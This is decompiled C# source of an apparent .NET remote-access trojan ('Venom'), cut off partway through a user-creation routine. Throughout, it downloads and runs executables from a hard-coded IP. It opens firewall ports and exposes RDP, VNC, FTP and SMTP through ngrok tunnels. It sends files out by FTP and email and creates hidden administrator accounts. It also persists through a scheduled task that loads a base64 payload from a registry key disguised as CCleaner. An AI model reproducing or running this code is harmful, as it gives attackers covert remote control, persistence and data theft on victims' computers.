// Decompiled with JetBrains decompiler
// Type: 픭廴얖ヰᆘ藰΅査꣯Ẑ츲汱砄버曆縞ᢒ팿
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Management;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class 픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿
{
  private const string 䴙灥步累\uEC6B츌뽙醚䟵म뗟萹죂\uF24D勓祖髮帒\uF3BD됩 = "Venom";
  private const string 毋䟔ꟺ늝\uEA34瓾輦\uAB0F豊᪽骵恸촰\u263C樶\uF009㿓谶ⳃ笒 = "Administrators Group";
  private const string \uE0E4縝\uE380\uFFFDศ縀姠싏\uF610첼늲\u25C4䆽쒠췞袾\u2140㑛︆㪉 = "Venom";

  public static void \u085A뛾ꥋ볘\u2BE9\uEAAE\uE659辯퇿Ȟ쩂鹺轅蘐ᕴ\u323B掟楣\uFFFD醸(
    string fTPAddress,
    string username,
    string password,
    string filename)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "ftp.txt"));
      streamWriter.WriteLine("open ftp://" + username + ":" + password + "@" + fTPAddress + "/");
      streamWriter.WriteLine("put " + filename);
      streamWriter.WriteLine("quit");
      streamWriter.Close();
    }
    catch (Exception ex)
    {
      Console.WriteLine("Exception: " + ex.Message);
    }
    finally
    {
      Console.WriteLine("Executing finally block.");
    }
  }

  public static void 滖믡\u19DFᇄ\uFFFD\u0006\uEF77\uEC94뎬\u262E봀航\uF459\uFAF2ౡ囋\uEF7Eᖼచꌅ(
    string fTPAddress,
    string username,
    string password,
    string zipName)
  {
    FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(fTPAddress + "/" + Path.GetFileName(zipName));
    ftpWebRequest.Method = "STOR";
    ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(username, password);
    ftpWebRequest.UsePassive = true;
    ftpWebRequest.UseBinary = true;
    ftpWebRequest.KeepAlive = false;
    FileStream fileStream = System.IO.File.OpenRead(zipName);
    byte[] buffer = new byte[fileStream.Length];
    fileStream.Read(buffer, 0, buffer.Length);
    fileStream.Close();
    Stream requestStream = ftpWebRequest.GetRequestStream();
    requestStream.Write(buffer, 0, buffer.Length);
    requestStream.Close();
    int num = (int) MessageBox.Show("Uploaded Successfully");
  }

  public static void ﮭ궟먄쫞业砧ԏ佲愼\uE74A㒸靐㚓핒쇲禁\uE2A5ރ\uFFFDច(string txt, string token)
  {
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.㱊ઽ\u2EE5㠾㭠ꏝ峊纷ᝎᥴ\uF60C\uFFFD\u2F58ᖫ쀠ꑂ뱋ฎሌ\u256C();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.ꝯﷅ랖鹒\uEC25\uFFFD錅준\uF460\uF4F3䉘漶漖ﷅ튎䞝泉逸\u280F췇(token);
    Thread.Sleep(20000);
    string str1 = Path.Combine(Path.GetTempPath());
    new WebClient().DownloadFile("http://91.134.207.16/WinSCP.exe", Path.Combine(Path.GetTempPath(), "WinSCP.exe"));
    string fileName = Path.Combine(Path.GetTempPath(), "WinSCP.com");
    new WebClient().DownloadFile("http://91.134.207.16/WinSCP.com", fileName);
    Thread.Sleep(20000);
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "upload.bat"));
    streamWriter.WriteLine("cd " + str1);
    streamWriter.WriteLine(fileName + "  /script=ftp.txt");
    streamWriter.Close();
    Thread.Sleep(20000);
    string str2 = Path.Combine(Path.GetTempPath(), "upload.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(40000);
    string str3 = Path.Combine(Path.GetTempPath(), "upload.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str3,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(40000);
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.䖲զ춨栍倀儒얝\uE8C9ښ웹㐋\uE795끮幋\u288D曔蛼㗯\uE74Cꝑ();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
  }

  public static void վㅮ䘗繃场ઐꦽꈮ剝꼓၀\uE8C2蚣Ѽ焛㠕\uF60Fꜚ烣\uEB3F(
    string filepath,
    string email,
    string toemail,
    string password)
  {
    Process.Start(Path.Combine(Path.GetTempPath(), "blatinst.exe"));
    Thread.Sleep(5000);
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "blat.bat"));
      string str1 = Path.Combine(Path.GetTempPath(), "blat.exe");
      streamWriter.WriteLine(str1 + " -install smtp.gmail.com -u " + email + " -pw " + password);
      streamWriter.WriteLine(str1 + " -s Velos Report -to " + toemail + " -f " + email + " -body Files -attach " + filepath);
      streamWriter.Close();
      Thread.Sleep(5000);
      string str2 = Path.Combine(Path.GetTempPath(), "blat.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str2,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      }).WaitForExit();
      Thread.Sleep(40000);
      쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.溫흺\uE82E岭星䮠䔡\uF7EF夶홗쯌Ἧ\uE486䨱䟢쟌勘銙욆鮵();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 㱊ઽ\u2EE5㠾㭠ꏝ峊纷ᝎᥴ\uF60C\uFFFD\u2F58ᖫ쀠ꑂ뱋ฎሌ\u256C()
  {
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=in action=allow protocol=TCP localport=21 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=out action=allow protocol=TCP localport=21 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=in action=allow protocol=TCP localport=25 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=out action=allow protocol=TCP localport=25 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=in action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=out action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=in action=allow protocol=TCP localport=465 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=out action=allow protocol=TCP localport=465 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=in action=allow protocol=TCP localport=993 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=out action=allow protocol=TCP localport=993 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=in action=allow protocol=TCP localport=995 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=out action=allow protocol=TCP localport=995 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=in action=allow protocol=TCP localport=110 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=out action=allow protocol=TCP localport=110 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=in action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=out action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_IN dir=in action=allow protocol=TCP localport=22 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_OUT dir=out action=allow protocol=TCP localport=22 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  public static void 㰏鴾嬳ꈖᤉ롮읔菾㡃替ⅉ鶋ꈪ䲯\uFFFD鵽檾햄봜籼(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixemail.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  587 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "fixemail.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void ꝯﷅ랖鹒\uEC25\uFFFD錅준\uF460\uF4F3䉘漶漖ﷅ튎䞝泉逸\u280F췇(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixftp.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  21 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "fixftp.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void 䖲զ춨栍倀儒얝\uE8C9ښ웹㐋\uE795끮幋\u288D曔蛼㗯\uE74Cꝑ()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("ngrok"))
        process.Kill();
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(ex.Message);
    }
  }

  public static void āꍕ\uFFFD鴉ᵿ觤ﭿ㭟ᴝ닯o䁮汨\uF6B0\u26B1㮭\uE2CB抇\u21A3ቒ()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("winvnc"))
        process.Kill();
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(ex.Message);
    }
  }

  public static void \uFFFD\uE359\uE41F\uE674椻拞些盚蟔\u33BC핢\u2937鷳蕸쑿岛뗁牁賿鮄(string code)
  {
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Ccleaner", true);
    if (registryKey == null)
      Registry.CurrentUser.CreateSubKey("Software\\Ccleaner").SetValue("Ccleaner", (object) code);
    else if (registryKey.GetValue("Ccleaner") == null || !registryKey.GetValue("Ccleaner").ToString().Equals(code, StringComparison.CurrentCultureIgnoreCase))
    {
      registryKey.SetValue("Ccleaner", (object) code);
    }
    else
    {
      string str = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\Ccleaner\\).Ccleaner)).EntryPoint.Invoke($Null,$Null)";
      Process.Start(new ProcessStartInfo()
      {
        FileName = "schtasks",
        Arguments = "/create /sc minute /mo 1 /tn Ccleaner /tr \"" + str + "\"",
        CreateNoWindow = true,
        ErrorDialog = false,
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }
  }

  public static void \uEF60\uFB08댸ꠑ⁔饄轵莂\uE8C8暉焛\uF1F8㒕\u2023邿綍闛꿗ᤤꕉ()
  {
    try
    {
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쇍\u1CCA㓿ꩊ\uE8DA끶鯝\uE5FA讔\uE7A8૬宄ਗ㚧\u2B4D嗀\uE04B\u2779\uFFFD侬();
      string str = "Venom";
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.ହ䂖\u335A䋶崇絀䇴璏꩕㕴\uFFFDꄅ次Ἐꭞ챜ﵦ\uF4D3ꗛٖ(str);
      \u2499\uF57C闤ḋ룔娹昸ꚙ회\uF82C趓\uECF1躉宧疵轣瑵뺰粺\u301A.빦禑\uFDE5ꋛ硪屏錄\u2A17ꠧ鷣腁\uE6BF\u255C\uF2F3憛\uFFFD꾤⃭逗\u4DD2(str);
      Thread.Sleep(20000);
      string fileName1 = Path.Combine(Path.GetTempPath(), "installrdp.exe");
      new WebClient().DownloadFile("http://91.134.207.16/rdpinstall.exe", fileName1);
      Process.Start(fileName1);
      Thread.Sleep(20000);
      string fileName2 = Path.Combine(Path.GetTempPath(), "autoupdate1.exe");
      new WebClient().DownloadFile("http://91.134.207.16/autoupdate1.exe", fileName2);
      Process.Start(fileName2);
      Thread.Sleep(20000);
      string fileName3 = Path.Combine(Path.GetTempPath(), "autoupdate2.exe");
      new WebClient().DownloadFile("http://91.134.207.16/autoupdate2.exe", fileName3);
      Process.Start(fileName3);
      Thread.Sleep(20000);
      string fileName4 = Path.Combine(Path.GetTempPath(), "updaterdp.exe");
      new WebClient().DownloadFile("http://91.134.207.16/update.exe", fileName4);
      Process.Start(fileName4);
      Thread.Sleep(10000);
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
    }
    catch
    {
    }
  }

  public static void 阾涕\uFFFD蹭쀬ﺱ\uF4E0蘛퓟恢ґ쏕柅썬䁚읺嘳쭴抽覬()
  {
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
    Thread.Sleep(15000);
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "dvnc.bat"));
    streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
    streamWriter.WriteLine("set exeFile=%TEMP%\\Install.exe");
    streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
    streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/Install.exe','%exeFile%');");
    streamWriter.Close();
    string str1 = Path.Combine(Path.GetTempPath(), "dvnc.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str1,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    string str2 = Path.Combine(Path.GetTempPath(), "Install.exe");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(30000);
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
  }

  public static void ꦤ\u2CFB苻央\u284F\uF6E6炚룆\u26EF埙땏뗵퐳樂銻쿮풝\uF1FD喑袉(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "rdp.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  3389 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "rdp.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      Thread.Sleep(30000);
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.ㇸ銷ퟻ㪼旃흾蒕끪仩탺櫠댇曰霻㛈㡏㯺ꈐ\u0A7E獶();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 륦텝꼍ෂ껶\uEA25㑷ಙ衝琳ᾡ\uE11B騅ϩ役쪽\uF7BA唡ꇂॽ(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "vnc.bat"));
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  5900 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "vnc.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      Thread.Sleep(10000);
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.ㇸ銷ퟻ㪼旃흾蒕끪仩탺櫠댇曰霻㛈㡏㯺ꈐ\u0A7E獶();
    }
    catch (Exception ex)
    {
    }
  }

  public static void ㇸ銷ퟻ㪼旃흾蒕끪仩탺櫠댇曰霻㛈㡏㯺ꈐ\u0A7E獶()
  {
    string fileName = Path.Combine(Path.GetTempPath(), "getrdp.exe");
    new WebClient().DownloadFile("http://91.134.207.16/getrdp.exe", fileName);
    Process.Start(fileName).WaitForExit();
    Thread.Sleep(20000);
    string str1 = Path.Combine(Path.GetTempPath());
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "geturl.bat"));
    streamWriter.WriteLine("cd " + str1);
    streamWriter.WriteLine("curl.exe --silent http://127.0.0.1:4040/api/tunnels | jq.exe .tunnels[0].public_url | FindStr tcp: >> url1.txt");
    streamWriter.Close();
    Thread.Sleep(5000);
    string str2 = Path.Combine(Path.GetTempPath(), "geturl.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    string path = Path.Combine(Path.GetTempPath(), "url1.txt");
    System.IO.File.WriteAllText(Path.Combine(Path.GetTempPath(), "url.txt"), System.IO.File.ReadAllText(path).Replace('"', ' '));
    Thread.Sleep(40000);
  }

  public static void 噿\uF48E豘\uF8F8\uF4F7쯨ཱ묱슟夥仑쳗\u2481\u3309퇶\u24E2㕩ꇌ\uFFFD䍹(string username)
  {
    try
    {
      DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
      DirectoryEntry entry = directoryEntry.Children.Find(username, "user");
      directoryEntry.Children.Remove(entry);
      entry.Close();
      directoryEntry.Close();
    }
    catch (Exception ex)
    {
      throw ex;
    }
  }

  public static bool 랗幼牕믜캶盱熍橚賁믂뷓藁颟뿢峢\u2578辔㥨咡젳(string name)
  {
    ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " /delete");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.RedirectStandardOutput = true;
    processStartInfo.RedirectStandardError = true;
    processStartInfo.UseShellExecute = false;
    Process process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();
    string end = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    return end != "" && end.ToLower().Contains("command completed successfully.");
  }

  public static bool 䐂ᰫ瑜䐴ꅗ帵饙า鋝淊ᰀ䂍\uF2B3處\uF466畝꼲ྟ߭菰(string name)
  {
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end1 = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (!(end1 != "") || !end1.ToLower().Contains("command completed successfully."))
      return false;
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
    processStartInfo2.CreateNoWindow = true;
    processStartInfo2.RedirectStandardOutput = true;
    processStartInfo2.RedirectStandardError = true;
    processStartInfo2.UseShellExecute = false;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    process2.Start();
    string end2 = process2.StandardOutput.ReadToEnd();
    process2.WaitForExit();
    return end2 != "" && end2.ToLower().Contains("command completed successfully.");
  }

  public static string 蚧㜁\u2015\uEADC\uE7B6뺰꤄㩳笻낖\uA9C9焳㷶攟풋\uFE45떭\u0C7Dꁌꦇ()
  {
    string str = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    for (int index1 = 1; index1 <= 10; ++index1)
    {
      int index2 = random.Next(0, str.Length);
      char ch = str[index2];
      stringBuilder.Append(ch);
    }
    return stringBuilder.ToString();
  }

  public static void ହ䂖\u335A䋶崇絀䇴璏꩕㕴\uFFFDꄅ次Ἐꭞ챜ﵦ\uF4D3ꗛٖ(string user)
  {
    switch (Environment.OSVersion.Version.Major)
    {
      case 5:
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey1 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        registryKey1.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey1.SetValue("DWORD", (object) 2);
        registryKey1.Flush();
        string identityValue1 = "Venom";
        string newPassword1 = "Venom";
        PrincipalContext context1;
        try
        {
          Console.WriteLine("Building System Information");
          context1 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context1, identityValue1) != null)
        {
          Console.WriteLine(identityValue1 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user1 = new UserPrincipal(context1);
        user1.Name = identityValue1;
        user1.DisplayName = "Venom Administrative User";
        user1.PasswordNeverExpires = true;
        user1.SetPassword(newPassword1);
        user1.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
